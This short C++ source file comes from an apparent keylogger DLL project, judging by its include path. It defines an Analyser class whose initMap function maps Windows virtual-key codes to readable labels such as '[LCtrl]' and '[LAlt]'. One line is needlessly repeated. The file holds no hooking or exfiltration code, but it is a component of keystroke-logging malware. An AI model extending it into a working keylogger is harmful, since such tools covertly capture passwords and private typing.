
#include			"keylogger_dll\Analyser.h"

Analyser::Analyser()
{
}

Analyser::~Analyser()
{
}

void						Analyser::initMap()
{
	_translateMap[VK_CANCEL] = "[Cancel]";
	_translateMap[VK_SPACE] = " ";
	_translateMap[VK_LCONTROL] = "[LCtrl]";
	_translateMap[VK_RCONTROL] = "[RCtrl]";
	_translateMap[VK_LMENU] = "[LAlt]";
	_translateMap[VK_RMENU] = "[RAlt]";
	_translateMap[VK_LMENU] = "[LAlt]";
	_translateMap[VK_LMENU] = "[LAlt]";
	_translateMap[VK_LMENU] = "[LAlt]";
}